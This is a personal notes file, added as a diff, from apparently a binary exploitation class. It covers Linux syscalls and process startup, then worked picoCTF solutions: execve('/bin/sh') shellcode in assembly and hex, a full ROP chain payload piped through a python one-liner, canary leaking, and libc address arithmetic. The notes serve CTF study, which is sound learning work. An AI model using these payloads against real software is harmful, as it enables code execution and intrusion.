@@ -1,0 +1,250 @@
+Chris Eagle
+
+system call is nothing more than a function call to the kernal
+
+            x86
+           /   \
+       int0x80  syscall(affects rcx and r11) parameters go in registers
+       sysenter
+
+Every function has a systemcall # that tells the kernal which systemcall to use
+
+eax holds system # in syscall
+ebx holds first arg to syscall
+ecx holds second
+edx
+esi
+edi
+ebp 
+
+for printf rdi holds pointer for format string
+
+ida
+functions in white: body of function is in binary
+functions in pink: body of function is imported
+
+gcc: -static flag makes it statically links binary
+
+bash is a command processor and every time you hit enter bash reads it in as a command.
+If you type 'asdfwefadfasd' and hit enter, it is the kernal that fails in 'execve()'--execve does not return unless there is an error-- not bash. bash reads the gibberish as a command
+
+'$./vuln'--what happens why you hit enter?
+1) shell process reads stdin to read './vuln\n' 
+|,<,>; characters only mean anything to shell and means nothing to kernal
+
+1.5) bash looks for file in directory in PATH; can be found with 'echo $PATH env'
+
+1.6) if you are a dynamically linked binary; ld is the dynamic linker and when execve is called execution starts in the linked library; cheese this eagle guy is too smart
+-- he mentioned Aux_vector(key val pairs) look it up [objdump -d filename --gave libraries]
+INTERP had requesting program interpreter: /lib/ld-linux.so.2
+-- ldd (list dynamic dependencies)
+
+
+1.7) 'start' happens here somewhere; first exection starts in 'start' for statically linked list
+--kernal doesn't know you wrote your program in c; main is a c function and main expects to called in c calling conventions
+--if you look at _start: you will see a call to __libc_start_main which is what tells start to run main; basically: kernal gets 'start' started and 'start' gets 'main' running;  :/ RIP
+
+
+2)before execve is run; fork() ['clone' can be used to create threads or processes] is run to create a new process. At this point, two instances of bash are running. Parent will hold a PID of function in eax while child will have PID=0. the child is run into execve.
+
+3) exevce("./hello,..."); is run to the kernal
+
+
+call __getegid
+call __setresgid
+these two calls set/change permissions
+
+strace can attach to a program and see every system call attached to a program
+
+
+--------Saturday--------------
+
+conditional jumps cause pipeline delays
+
+fetch    decode    execute
+
+1) jz  --  --
+2) add jz --
+3) push add jz
+4) 'jz' realizes that add and push are incorrect instructions due to condition, so it stalls because it becomes: -- -- --
+
+
+Slippery-Shellcode (picoCTF problem)
+shell storm is pretty decent
+'a = &b'; '&' = address of operator in c language
+
+vuln is given a pointer to the address of the buffer declared in main. 'gets' call in vuln puts user input in buffer via gets(buffer).
+
+stack looks like:
+
+|ebp|
+|ret addr| <-- this is ret from vuln
+|other shit|
+|buff of 512| <-- this is where input from gets(from vuln) is placed; this overflow does not affect the ret address from vuln 
+|ret addr| <-- this is ret from main
+
+
+'A' would work instead of nop because 0x41 is actually increment ecx in 32-bit architecture
+
+'movzx edx, dl' puts the random byte into edx and zero extends it to fit the rest of edx
+
+
+                  ebx      ecx      edx
+we want execve("/bin/sh", {NULL}, {NULL} )
+							^       This is env vector
+							|
+							This is argument vector
+
+our shellcode should be:
+
+mov eax, 11 <-- this is system call number which can be found in usr/include/x86_64-linux-gnu/asm/unistd which prefixes as unix_standard 
+int 0x80 <-- this is because execve does not return
+
+sneaky way to push zeros onto the stack without using zeros or NULLs: 
+xor eax, eax 
+push eax
+push '//sh' <--unix doesn't care about multiple slashes, it reads it as only one
+push '/bin'
+mov ebx, esp
+mov ecx, eax
+mov edx, eax
+mov eax, 11 <-- the 3 bytes prefixing the 11 is NULLs or zero's so use: push byte11; pop eax
+int 0x80
+
+I used nasm where I wrote this into 
+'vim hax.asm';
+'nasm -f bin hax.asm';
+'nasm -f bin -l sh.lst hax.asm' ;
+
+nasm -f flag is which file format to get
+nasm -l flag gives you a human readable file so you can check things like which instruction gave which null byte
+objcopy is a way to grab just the text section
+
+
+if you do "python print '\x90' * 300 + shellcode | ./slippery" then input stream has ended. You landed the shell but bash tries to read more input but the process of python has ended so input stream is dead
+
+to fix this and keep input stream open:
+" (python print '\x90' * 300 + shellcode; cat) | ./slippery "
+The parenthesis and the 'cat' are really important
+the '()' makes bash read the entire portion behind the PIPE as one single input. 'cat' reads from stdin and writes to sdout. so keeping the cat open without anything keeps the input stream open. You can then type commands to bash as your keystrokes are still read and the process is not dead
+
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\x6a\x0b\x58\xcd\x80
+
+you can do ~~~ cat ) | strace ./slippery in order to view syscommands
+
+
+
+
+rop32 (picoCTF problem)
+checksec.sh can show you protections on file
+
+this is not executable stack
+
+because the file is statically linked we can use entire c functions as our gadgets
+'fopen' is there
+
+High Level:
+we need "/bin/sh" or "flag.txt" in memory to get a pointer to these strings
+We want open, read, write
+
+file descriptor:
+0- stdin
+1- stdout
+2- stderror
+
+
+Gadget formats:
+
+read 		| addr of read
+next gadget | addr of a pop,pop,pop,ret
+0 			| file descriptor
+buffer 		| add or writable mem i.e. .data section
+9  			| 9 bytes read in for "flag.txt\n"; need to specify 9 bytes because read will not reach EOF and will then hang and wait for more bytes when there are none
+			|
+open 		| addr of open 
+next gadget | 0x806CD03addr to a pop, pop, ret to clear stack args and go to read gadget
+flat.txt 	| need some pointer to flag
+0 			| file descriptor
+			|
+read 		| 0x806CD80 addr of read function
+ret 		| 0x806CD02 addr of next gadget of pppr
+3			| file descriptor to read from
+buffer		| 0x80DB320 addr of writable .data section or .bss section
+256 bytes	| enough space to read into; this is okay because the file reaches EOF and terminates read
+			|
+write 		| addr of write
+exit 		| addr to close properly
+1 			| file descriptor
+buffer 		| 
+256   		|
+exit
+
+we are basically doing:
+
+initial read is to get 'flag.txt' into buffer
+
+open("flag.txt", 0) <-- assigns '3' handle to flag.txt
+read(s, bufer, 256)
+write(1,buffer,256)
+
+because we are interfacing with gets, we need enter a newline at the end
+
+28 * 'A' needed to buffer past vuln
+
+do the nasm to get the shellcode
+
+"\x80\xcd\x06\x08\x02\xcd\x06\x08\x00\x00\x00\x00\x20\xb3\x0d\x08\x09\x00\x00\x00\x60\xcc\x06\x08\x03\xcd\x06\x08\x20\xb3\x0d\x08\x00\x00\x00\x00\x80\xcd\x06\x08\x02\xcd\x06\x08\x03\x00\x00\x00\x20\xb3\x0d\x08\x00\x01\x00\x00\x50\xce\x06\x08\xc0\xee\x04\x08\x01\x00\x00\x00\x20\xb3\x0d\x08\x00\x01\x00\x00"
+
+
+python -c "from sys import stdin,stdout; print 'A'*28 + '\x80\xcd\x06\x08\x02\xcd\x06\x08\x00\x00\x00\x00\x20\xb3\x0d\x08\x09\x00\x00\x00\x60\xcc\x06\x08\x03\xcd\x06\x08\x20\xb3\x0d\x08\x00\x00\x00\x00\x80\xcd\x06\x08\x02\xcd\x06\x08\x03\x00\x00\x00\x20\xb3\x0d\x08\x00\x01\x00\x00\x50\xce\x06\x08\xc0\xee\x04\x08\x01\x00\x00\x00\x20\xb3\x0d\x08\x00\x01\x00\x00\x0a'; stdout.flush(); stdin.readline(); print 'flag.txt\x00'" | ./rop32
+
+need to flush because when you strace you see that you are reading in more bytes that you wanted. stdio is greedy and the whole point of the readline is to give a pause for the kernal/buffer to take the two prints separately. gets wants to read 4096 when you only need to send 106. A pause/sleep for 1 sec would have accomplished the same thing. checking file descriptors are also critical bc the 3 was technically a guess.
+
+
+
+scv (a return to libc and beat the canary challenge)
+
+|buff|<- ida says buffer is 168 bytes
+|  | |
+|  | |
+|  | |
+| \/ |
+|bird| <- canary which always ends in \x00 (and is the first byte due to little endian)
+|stuf|
+|ret |
+
+buffer overflow in the program when the program reads in more bytes that the buffer size.
+so we fill 169 bytes to fill the buffer and remove the null byte from the canary. This will continue to read in bytes until # read bytes max is reached or \x00 is reached to end read.
+
+This will leak the canary
+
+Once we have the canary, then we can begin the rop.
+
+          PLT  GOT
+         puts(puts)
+
+Payload: puts - puts_offset + system_offset
+
+--limitless picoCTF challenge--
+array + sizeof(type)*index is how c does indexing
+IF THERE IS NO BOUNDS CHECK then you can smash the stack backwards.
+the reason we have a replaceIndex... function is so that we have another stack frame with a return address above the array to overright the return address of the replaceIndex... function --> direct to win()
+
+if array was in main, we can only destroy stack downwards
+
+
+sploitfun4u https://sploitfun.wordpress.com/archives/
+once upon a free -- heap exploit
+
+
+
+---------ropstuff------
+
+This will always work if you can get a pointer to binsh and call system
+system
+binsh
+poprdi
+
+
+This will not always work because you need the three args to be valid pointers
+execve (binsh, NULL, NULL)
